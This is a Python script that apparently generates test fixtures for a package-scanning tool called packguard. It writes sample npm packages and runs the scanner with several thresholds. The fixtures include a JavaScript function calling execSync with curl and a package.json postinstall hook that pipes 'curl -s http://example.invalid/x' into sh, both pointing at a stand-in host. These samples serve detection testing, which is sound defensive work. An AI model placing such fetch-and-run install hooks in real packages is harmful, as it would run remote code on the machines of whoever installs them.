import json
import os
import shutil
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(os.path.dirname(HERE))
EXE = sys.argv[1] if len(sys.argv) > 1 else os.path.join(REPO, "build", "packguard.exe")


def write(path, data, mode="w"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, mode, newline=None if "b" in mode else "\n") as f:
        f.write(data)


def run(args):
    p = subprocess.run([EXE] + args, capture_output=True, text=True)
    if p.returncode != 0:
        raise SystemExit(p.stderr)


payload = "function evil() { return require('child_process').execSync('curl http://example.invalid/x'); }\n" * 60
tiny = "x" * 100
largest = "y" * 200
smaller = "z" * 80
exact = "b" * 256

refs = os.path.join(HERE, "refs")
targets = os.path.join(HERE, "targets")
out = os.path.join(HERE, "reports")
for path in (refs, targets, out, os.path.join(HERE, "reports_m0")):
    shutil.rmtree(path, ignore_errors=True)
os.makedirs(out)
os.makedirs(os.path.join(HERE, "reports_m0"))

write(os.path.join(refs, "groupA", "evil@1.0.0", "index.js"), payload)
write(os.path.join(targets, "mixed@1.0.0", "big.js"), payload)
write(os.path.join(targets, "mixed@1.0.0", "tiny_stub.js"), tiny)
write(os.path.join(targets, "mixed@1.0.0", "package.json"),
      '{"scripts": {"postinstall": "curl -s http://example.invalid/x | sh"}}\n')
write(os.path.join(targets, "all_tiny@1.0.0", "largest.js"), largest)
write(os.path.join(targets, "all_tiny@1.0.0", "smaller.js"), smaller)
write(os.path.join(targets, "boundary@1.0.0", "exact.js"), exact)

packages = [os.path.join(targets, name) for name in ("mixed@1.0.0", "all_tiny@1.0.0", "boundary@1.0.0")]
run(["-j", "2", "-m", "256", "-t", "0.19", "-s", "0.45", "-d", out, refs] + packages)
run(["-j", "2", "-m", "0", "-t", "0.19", "-s", "0.45", "-d", os.path.join(HERE, "reports_m0"), refs] + packages)

print("generated", len(packages), "reports in", out, "and reports_m0")
print(json.dumps({"tiny": len(tiny), "largest": len(largest), "smaller": len(smaller), "exact": len(exact)}))
